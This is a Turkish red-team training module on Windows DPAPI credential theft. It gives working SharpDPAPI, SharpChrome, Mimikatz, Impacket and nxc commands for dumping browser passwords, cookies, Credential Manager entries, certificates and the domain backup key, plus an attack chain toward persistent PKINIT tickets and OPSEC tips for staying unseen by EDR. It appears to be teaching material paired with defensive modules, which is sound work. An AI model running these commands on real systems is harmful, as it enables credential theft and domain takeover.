## 1. Kavramsal Temel — Neden Var?

LSASS ([03.2](./03.2_LSASS_Bellek_Dokumu.md)) o an oturum açmış kimlikleri verir. Ama makinede **saklanmış (at-rest)** sırlar da vardır: kayıtlı RDP/Wi-Fi parolaları, tarayıcı çerezleri/parolaları, Credential Manager girdileri, uygulama sırları. Bunları Windows **DPAPI (Data Protection API)** ile şifreler:

> **DPAPI, uygulamaların "bu sırrı şifrele/çöz" demesini sağlayan bir OS servisidir. Şifreleme anahtarı kullanıcının parolasından (veya makine anahtarından) türetilir. Saldırgan için mesaj net: kullanıcının DPAPI master key'ini ele geçirirsen, o kullanıcının TÜM DPAPI-korumalı sırlarını (çerezler, kayıtlı parolalar, sertifika özel anahtarları) offline çözebilirsin — LSASS'a hiç dokunmadan.**

Bu, Credential Guard'ın bile koruyamadığı bir damardır: CG, LSASS'taki oturum sırlarını izole eder ama **diskte DPAPI ile şifreli dosyalar** yerinde durur; kullanıcı bağlamında veya master key ile çözülür.

**Analoji:** DPAPI = her kullanıcıya özel bir kasa. Kasanın anahtarı kullanıcının parolasından üretilir. Anahtarı (master key) ele geçirirsen kasadaki her şeyi açarsın — kasayı kırmadan.

## 2. Teknik Derinlik — DPAPI Anahtar Hiyerarşisi

### 2.1 Master key zinciri

```
   Kullanıcı parolası (veya NT hash)
        │  PBKDF2
        ▼
   Pre-key ──▶ Master Key (%APPDATA%\Microsoft\Protect\<SID>\<GUID>)
        │
        ▼  her sır bir master key ile şifreli
   ┌────────────────────────────────────────────────┐
   │ Chrome/Edge çerez & parola (Login Data)         │
   │ Credential Manager (Generic/Domain creds)       │
   │ Wi-Fi parolaları, RDP .rdg, scheduled task creds│
   │ Sertifika özel anahtarları (PKINIT için!)       │
   └────────────────────────────────────────────────┘
```

### 2.2 Master key'i çözmenin üç yolu

| Yol | Gereksinim | Not |
|-----|-----------|-----|
| **Kullanıcı bağlamı** | Kurban olarak kod çalıştır | `CryptUnprotectData` OS'a çözdürür, anahtarı bilmene gerek yok |
| **Kullanıcı parolası/hash** | Parola veya NT hash | Master key'i offline türet |
| **Domain backup key** | **DC'de RSA yedek anahtarı** | Domain'deki HERKESİN master key'ini çözer — [09.x](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/) |

> **Domain backup key = altın anahtar.** DC, her kullanıcının master key'inin bir kopyasını domain RSA yedek anahtarıyla şifreler (parola sıfırlamalarında sır kaybını önlemek için). Domain admin isen bu backup key'i bir kez çekersin (`lsadump::backupkeys`) → **domaindeki her kullanıcının** tüm DPAPI sırlarını çözebilirsin. Bu, DA sonrası kalıcı ve sessiz bir hasat yoludur.

### 2.3 Chrome/Edge özel durumu (App-Bound Encryption)

Modern Chrome (v127+) çerezleri **App-Bound Encryption** ile ek bir katmana sardı; artık sadece DPAPI yetmez, tarayıcının kendi bağlamında çözüm gerekir. Yine de SYSTEM/kullanıcı bağlamında çalışan araçlar (SharpChrome güncel sürümleri, çözücüler) bunu ele alır.

### 2.4 Master key blob ve RPC çözüm yolu

Bir master key dosyası (`%APPDATA%\Microsoft\Protect\<SID>\<GUID>`) şu alanları taşır:

```
MasterKeyFile {
   MasterKey       : E(pre-key)         ← kullanıcı parolası/hash türevi
   BackupKey / DomainKey : E_domainRSA(masterkey)  ← DC yedek anahtarıyla
   guidMasterKey   : {GUID}             ← her sır bu GUID'e referans verir
}
```

> **İki çözüm kapısı, iki iz:** (1) **Yerel** — kullanıcının parola/NT hash'iyle `pre-key` türet, offline çöz (iz yok). (2) **RPC** — Mimikatz `/rpc`: master key'i **DC'ye çözdür** (`MS-BKRP` protokolü, `BackuprKey`). RPC yolu parola gerektirmez ama DC'de iz bırakır. DA isen `backupkeys` ile domain RSA özel anahtarını bir kez al → tüm kullanıcıları offline çöz.

### 2.5 Hangi sır nerede — DPAPI korumalı dosya haritası

```
   Credential Manager : %APPDATA%\Microsoft\Credentials\<hex>
   Chrome/Edge login  : %LOCALAPPDATA%\...\User Data\Default\Login Data (SQLite)
   Chrome/Edge cookie : ...\Network\Cookies (SQLite, DPAPI+AppBound)
   RDP kayıtlı parola : %APPDATA%\...\Terminal Server Client + .rdg dosyaları
   Scheduled Task creds: C:\Windows\System32\Tasks + Credentials store
   Wi-Fi WPA parolası : ProgramData\Microsoft\Wlansvc\Profiles (DPAPI-machine)
   Sertifika özel anah.: %APPDATA%\Microsoft\Crypto\RSA\<SID>  ← PKINIT için! (Modül 07)
```

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 SharpDPAPI / SharpChrome (GhostPack)

```
:: Kullanıcı bağlamında tüm master key'leri çöz (parola gerekmez)
SharpDPAPI.exe masterkeys
:: Credential Manager sırları
SharpDPAPI.exe credentials
:: Chrome/Edge çerez + kayıtlı parola
SharpChrome.exe logins
SharpChrome.exe cookies /format:json
:: Domain backup key ile (DA iken) TÜM kullanıcıların master key'leri
SharpDPAPI.exe backupkey /nowrap        :: pvk'yi al
SharpDPAPI.exe masterkeys /pvk:backup.pvk
```

### 3.2 Mimikatz DPAPI modülü

```
dpapi::masterkey /in:"%APPDATA%\Microsoft\Protect\<SID>\<GUID>" /rpc   :: RPC ile DC'den çöz
dpapi::cred /in:"...\Credentials\<file>"
lsadump::backupkeys /system:dc01.corp.local /export       :: domain backup key (DA gerekir)
```

### 3.3 Linux (Impacket dpapi)

```bash
# Toplanan master key + credential dosyalarını offline çöz
impacket-dpapi masterkey -file masterkey_file -sid <SID> -password 'Welcome1'
impacket-dpapi credential -file cred_file -key <decrypted_masterkey>

# nxc ile uzaktan DPAPI hasadı
nxc smb 10.10.10.42 -u admin -p 'Pass!' --dpapi
```

**Örnek çıktı (SharpChrome):**
```
URL      : https://portal.corp.local
Username : svc-portal
Password : P0rtal!2023        ← düz parola ele geçti (DPAPI çözüldü)
```

### 3.4 Sertifika hasadı (PKINIT'e köprü)

```
:: DPAPI korumalı kullanıcı/makine sertifikalarını (özel anahtar dahil) çıkar
SharpDPAPI.exe certificates /nowrap
SharpDPAPI.exe certificates /machine        :: makine sertifikaları (SYSTEM gerekir)
:: çıkan .pfx ile PKINIT → TGT (parola değişse bile geçerli) → Modül 07
```

### 3.5 Gerçek-dünya DPAPI zinciri

```
   1) jsmith iş istasyonunda kullanıcı bağlamında SharpChrome logins
      → portal.corp.local için svc-portal:P0rtal!2023 (düz parola!)
   2) SharpDPAPI credentials → Credential Manager'da 'srv-backup' domain cred
   3) SharpDPAPI certificates → jsmith'in Client Auth sertifikası (.pfx)
      → Rubeus asktgt /certificate → PKINIT TGT (parola değişse bile kalıcı)
   4) DA aldıktan sonra: SharpDPAPI backupkey → domain RSA → HERKESİN sırları
```

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |

| Credential Manager | T1555.004 | `Credentials\` klasör erişimi | [Blue 03.4](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.4_DPAPI_ve_Onbelleklenmis_Kimlik.md) |

**OPSEC notları:**
- **Kullanıcı bağlamında `CryptUnprotectData`** kullanmak en sessizdir — OS anahtarı senin için çözer, master key dosyasına ham erişim/parola gerekmez, EDR için "normal API kullanımı" gibi görünür. Master key dosyalarını ham okuyup offline çözmek daha çok iz bırakır.
- **Domain backup key** talebi DC'de RPC izi bırakır (`LsarRetrievePrivateData`/`G$BCKUPKEY`). Bu nadir bir işlemdir → savunmacı için yüksek-değerli alarm ([Blue 03.4](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.4_DPAPI_ve_Onbelleklenmis_Kimlik.md)). Yalnızca DA'yı zaten aldıktan sonra, kalıcı hasat için kullan.
- **Sertifika özel anahtarları** DPAPI ile korunur → SharpDPAPI `certificates` ile PKINIT-yetenekli sertifikaları çıkar → [Modül 07 — AD CS](../Modul_07_AD_CS_PKI_Saldirilari/) (kimliği sertifikayla taklit). Bu, parola değişse bile geçerli kalan güçlü bir yoldur.
- DPAPI, **Credential Guard'ı atlar** çünkü diskteki şifreli veriyi hedefler, LSASS oturum sırlarını değil.
